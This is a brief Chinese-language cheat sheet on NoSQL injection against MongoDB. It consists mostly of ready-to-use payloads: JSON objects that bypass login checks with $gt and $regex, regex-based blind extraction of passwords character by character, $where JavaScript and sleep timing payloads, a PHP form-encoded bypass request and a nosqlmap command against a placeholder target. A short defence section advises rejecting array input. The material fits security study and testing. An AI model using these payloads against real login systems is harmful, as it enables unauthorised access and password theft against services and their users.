# NoSQL 注入（MongoDB）

## 操作符
```
$gt  $lt  $ne  $regex  $where  $exists  $in  $nin
```

## 绕过认证
```json
{"username":"admin","password":{"$gt":""}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":{"$regex":".*"},"password":{"$regex":".*"}}
```

## $regex 盲注
```json
{"username":"admin","password":{"$regex":"^a.*"}}
{"username":"admin","password":{"$regex":"^b.*"}}
```

## $where JS执行
```json
{"$where":"1==1"}
{"$where":"sleep(5000)"}
{"$where":"this.password.length==32"}
```

## PHP 特有（$_POST 解析数组）
```http
POST /login
Content-Type: application/x-www-form-urlencoded
username=admin&password[$gt]=
```

## 防御
过滤 `$` 开头的键，校验输入类型为字符串而非数组
```php
if (is_array($_POST['password'])) die("Invalid input");
```

## 工具
```bash
python nosqlmap.py -u "http://target/login.php" -p "username=admin&password=test"
```
